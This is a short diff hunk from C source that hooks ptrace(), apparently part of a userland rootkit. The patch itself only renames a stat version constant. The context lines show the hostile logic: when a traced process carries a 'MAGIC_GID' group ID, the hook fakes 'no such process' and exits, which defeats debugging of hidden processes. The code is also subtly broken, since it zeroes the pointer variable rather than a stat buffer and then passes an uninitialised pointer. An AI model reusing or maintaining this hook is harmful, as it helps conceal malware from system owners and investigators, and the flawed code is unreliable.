@@ -15,7 +15,7 @@ long ptrace(void *request, pid_t pid, void *addr, void *data)
     HOOK(old_xstat, C__XSTAT);
     struct stat *pstat;
     memset(&pstat, 0, sizeof(pstat));
-    if(old_xstat(__STAT_VER, proc_path, pstat) < 0) return old_ptrace(request, pid, addr, data);
+    if(old_xstat(_STAT_VER, proc_path, pstat) < 0) return old_ptrace(request, pid, addr, data);
     if(pstat->st_gid == MAGIC_GID) { errno = ESRCH; exit(-1); }
 
     #ifndef PTRACE_BUG
